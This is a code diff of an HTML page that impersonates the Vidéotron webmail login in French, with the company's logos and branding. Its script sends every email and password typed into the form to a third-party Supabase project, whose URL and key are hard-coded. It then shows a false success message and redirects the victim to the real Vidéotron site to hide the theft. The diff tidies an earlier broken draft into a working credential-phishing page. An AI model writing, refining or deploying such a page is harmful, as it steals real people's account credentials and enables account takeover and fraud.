@@ -1,134 +1,90 @@
 <!DOCTYPE html>
-<!-- Include Supabase JS SDK -->
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Vidéotron Courriel Web</title>
+  <link rel="shortcut icon" href="https://www.videotron.com/resources/legacy/img/espace_clientplus.png">
+  <link href="style.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
-<!-- Initialize Supabase Client -->
-<script>
-  const supabase = supabase.createClient(
-    'https://swccdhnrrudikrubracz.supabase.co', // 
-    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN3Y2NkaG5ycnVkaWtydWJyYWN6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgzNTI1MzksImV4cCI6MjA2MzkyODUzOX0.rXJQ67THl3qKDBe57UDv3ZjUbxxO4gQEkixgOVfhD18'
-  );
-</script>
-<html>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm"></script>
-<script type="module">
-  const supabase = createClient('https://swccdhnrrudikrubracz.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN3Y2NkaG5ycnVkaWtydWJyYWN6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgzNTI1MzksImV4cCI6MjA2MzkyODUzOX0.rXJQ67THl3qKDBe57UDv3ZjUbxxO4gQEkixgOVfhD18');
+  <!-- Supabase SDK -->
+  <script type="module">
+    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
 
-  // Example usage:
-  const { data, error } = await supabase.auth.signInWithPassword({
-    email: 'user@example.com',
-    password: 'yourpassword'
-  });
-</script>
-<link rel="shortcut icon" href="https://www.videotron.com/resources/legacy/img/espace_clientplus.png">
- </head>
-	<meta charset="UTF-8">
-	<title>Vidéotron Courriel Web</title>
-	<link href="style.css" rel="stylesheet">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    const supabase = createClient(
+      'https://swccdhnrrudikrubracz.supabase.co',
+      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN3Y2NkaG5ycnVkaWtydWJyYWN6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgzNTI1MzksImV4cCI6MjA2MzkyODUzOX0.rXJQ67THl3qKDBe57UDv3ZjUbxxO4gQEkixgOVfhD18'
+    );
+
+    window.addEventListener('DOMContentLoaded', () => {
+      const form = document.getElementById('login-form');
+      const successMsg = document.getElementById('form-success');
+
+      form.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        const { error, data } = await supabase.auth.signInWithPassword({ email, password });
+
+        if (error) {
+          alert('Erreur de connexion: ' + error.message);
+        } else {
+          form.reset();
+          successMsg.style.display = 'block';
+          setTimeout(() => {
+            window.location.href = 'https://courrielweb.videotron.com/iwc_static/layout/main.html?lang=fr-ca&3.0.2.2.0_20010958&u=1';
+          }, 4000);
+        }
+      });
+    });
+  </script>
 </head>
-<body>
-<body style="background-color:#white;">
-<p>
-
-<p>
-<p>
-<p>
-<div class="login-page">
-<div class="form">
-  <div class="text-center text-gray-800 text-lg text-bold my-5">
-	<body>
-	</head>
-<body onload="myFunction()" style="margin:0;">
+<body style="background-color: white;">
 
 <div id="loader"></div>
-
 <div style="display:none;" id="myDiv" class="animate-bottom">
-<img align="top" alt="web " src="https://www.videotron.com/resources/legacy/img/Videotron_FR_RGB_pour_fond_blanc.png" width="220" height="50">
-<h3>Connectez-vous à l'espace client</h3>
+  <img src="https://www.videotron.com/resources/legacy/img/Videotron_FR_RGB_pour_fond_blanc.png" width="220" height="50" alt="Vidéotron">
+  <h3>Connectez-vous à l'espace client</h3>
 </div>
 
 <script>
-var myVar;
-
-function myFunction() {
-  myVar = setTimeout(showPage, 3000);
-}
-
-function showPage() {
-  document.getElementById("loader").style.display = "none";
-  document.getElementById("myDiv").style.display = "block";
-}
+  function myFunction() {
+    setTimeout(() => {
+      document.getElementById("loader").style.display = "none";
+      document.getElementById("myDiv").style.display = "block";
+    }, 3000);
+  }
+  window.onload = myFunction;
 </script>
+
+<div class="login-page">
+  <div class="form">
+    <fieldset style="margin: auto; width: 390px; background-color: #dbdbdb; border: 2px inset">
+      <div style="text-align:center;">
+        <img src="https://www.videotron.com/resources/legacy/img/espace_clientplus.png" width="40" height="40" alt="icon">
+        <div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 2px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;">
+          ✅ Merci ! Connexion réussie – Redirection vers le portail….
+        </div>
+        <form id="login-form">
+          <input type="email" id="email" placeholder="Email" required />
+          <br>
+		  <p>
+          <input type="password" id="password" placeholder="Password" required />
+          <button type="submit">Se connecter <i class="fa fa-lock"></i></button>
+        </form>
+      </div>
+    </fieldset>
+    <h5 style="text-align: center;">Vidéotron garde votre vie connectée de n'importe où, à tout moment.</h5>
+  </div>
+</div>
+
+<div class="footer" style="text-align: center; margin-top: 2em;">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcStoywsZEXK8fQ_zJX_3uCU245AHtuWpBM6JTN7Cl_PHL8PQspH3jOxwtYWFtzs9aFioYA&usqp=CAU" width="40" height="40" alt="logo">
+  <p>© Vidéotron 2025</p>
+</div>
 
 </body>
 </html>
-									<div class="clearfix"></div>
-    </p>
-<fieldset style="center: left; width: 390px; background-color:219, 219, 219; border: 2px inset">
-<div style="text-align:center;">
-</span>
-<br>
-<p>
-    </p>
-<img align="top" alt="web " src="https://www.videotron.com/resources/legacy/img/espace_clientplus.png" width="40" height="40">
-    </p>
-<p>
-<div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 2px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;">
-  ✅ Merci ! Connexion réussie – Redirection vers le portail….
-</div>		
-<form id="login-form">
-  <input type="email" id="email" placeholder="Email" required />
-  <br>
-  <p>
-  <input type="password" id="password" placeholder="Password" required />
-  <button type="submit">Se connecter <i class="fa fa-lock"></i></button>
-</form>
-<br>
-<h5>Vidéotron garde votre vie connectée de n'importe où, à tout moment.</h5>   
- 
-            <div>              			
-</div>
-</div>
-  <p>
-  <p>
-  </p>
-</form>
-<p>
-<script>
-  const form = document.getElementById('contact-form');
-  const successMsg = document.getElementById('form-success');
-
-  form.addEventListener('submit', async function (e) {
-    e.preventDefault();
-
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-
-    const { error, user } = await supabase.auth.signInWithPassword({ email, password });
-
-    if (error) {
-      alert('Erreur de connexion: ' + error.message);
-    } else {
-      form.reset();
-      successMsg.style.display = 'block';
-      setTimeout(() => {
-        window.location.href = 'https://courrielweb.videotron.com/iwc_static/layout/main.html?lang=fr-ca&3.0.2.2.0_20010958&u=1';
-      }, 4000);
-    }
-  });
-</script>
-	
-</div>		
-</style>
-</head>
-<body>
-
-<h2></h2>
-<p></p>
-
-
-<div class="footer">
-<img "left" alt="web"src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcStoywsZEXK8fQ_zJX_3uCU245AHtuWpBM6JTN7Cl_PHL8PQspH3jOxwtYWFtzs9aFioYA&usqp=CAU" width="40" height="40"><p> © Vidéotron 2025</p>
-</div>
